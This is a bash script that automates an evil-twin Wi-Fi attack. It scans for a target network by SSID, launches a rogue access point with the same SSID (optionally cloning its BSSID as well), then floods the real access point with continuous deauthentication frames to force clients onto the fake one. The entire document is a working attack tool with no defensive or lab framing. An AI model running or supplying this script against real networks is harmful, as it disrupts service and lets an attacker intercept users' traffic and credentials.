#!/bin/bash

# Prompt for SSID and interface
read -p "Enter target SSID: " ssid
read -p "Enter your wireless interface (e.g., wlan0): " iface

# Start monitor mode
echo "[*] Enabling monitor mode on $iface..."
airmon-ng start "$iface" > /dev/null
iface_mon="${iface}mon"

# Ask user which AP type to launch
echo ""
echo "Choose Rogue AP Type:"
echo "1) Same SSID only"
echo "2) Same SSID + BSSID (full clone)"
read -p "Enter choice [1 or 2]: " choice

# Find real AP’s BSSID and channel
echo "[*] Scanning for real AP with SSID '$ssid'..."
timeout 10 airodump-ng --essid "$ssid" --write-interval 1 --output-format csv -w /tmp/ap_scan "$iface_mon" > /dev/null 2>&1

real_bssid=$(grep "$ssid" /tmp/ap_scan-01.csv | head -n 1 | cut -d',' -f1 | tr -d ' ')
real_channel=$(grep "$ssid" /tmp/ap_scan-01.csv | head -n 1 | cut -d',' -f4 | tr -d ' ')

if [ -z "$real_bssid" ] || [ -z "$real_channel" ]; then
    echo "[!] Could not find real AP with SSID: $ssid"
    exit 1
fi

echo "[+] Real AP found: $real_bssid on channel $real_channel"

# Choose a different channel for the rogue AP
# If real AP is on channel 11, rogue will be on channel 6, for example.
if [ "$real_channel" -eq 11 ]; then
    rogue_channel=6
else
    rogue_channel=11  # Default fallback to channel 11
fi

# Start Rogue AP in a new terminal on a different channel
if [ "$choice" == "1" ]; then
    echo "[*] Starting Rogue AP (same SSID only) on channel $rogue_channel..."
    gnome-terminal -- bash -c "airbase-ng -e '$ssid' -c $rogue_channel $iface_mon; exec bash"
elif [ "$choice" == "2" ]; then
    echo "[*] Starting Rogue AP (same SSID and BSSID: $real_bssid) on channel $rogue_channel..."
    gnome-terminal -- bash -c "airbase-ng -e '$ssid' -a '$real_bssid' -c $rogue_channel $iface_mon; exec bash"
else
    echo "[!] Invalid choice. Exiting."
    exit 1
fi

# Wait a bit to ensure rogue AP is started
sleep 5

# Deauth Real AP (on its channel)
echo "[*] Deauthenticating real AP ($real_bssid) on channel $real_channel..."
iwconfig "$iface_mon" channel "$real_channel"
aireplay-ng --deauth 0 -a "$real_bssid" "$iface_mon"
